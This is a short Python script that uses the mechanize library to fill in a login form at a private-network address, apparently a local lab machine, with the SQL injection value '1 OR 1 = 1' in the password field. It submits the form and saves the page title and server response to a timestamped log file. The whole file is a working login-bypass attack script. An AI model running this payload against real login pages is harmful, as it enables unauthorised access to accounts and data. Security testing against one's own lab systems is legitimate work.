# -*- coding: utf-8 -*-
import mechanize
import datetime
import chardet
# url = input("Enter the full url: ")
url = 'http://192.168.56.101/login.php'
attack_no = 1
request = mechanize.Browser()
request.open(url)
request.select_form(nr = 0)
request["password"] = "1 OR 1 = 1"
request["email"] = "#"
response = request.submit()

req_data = str(request.title())
res_data = str(response.read())

#ファイル出力処理
now = datetime.datetime.now()
to_file = './logs/data_{}.txt'
to_file = to_file.format(now)

data_file = open(to_file, 'x')
data_file.write(req_data)
data_file.write(res_data)
data_file.close()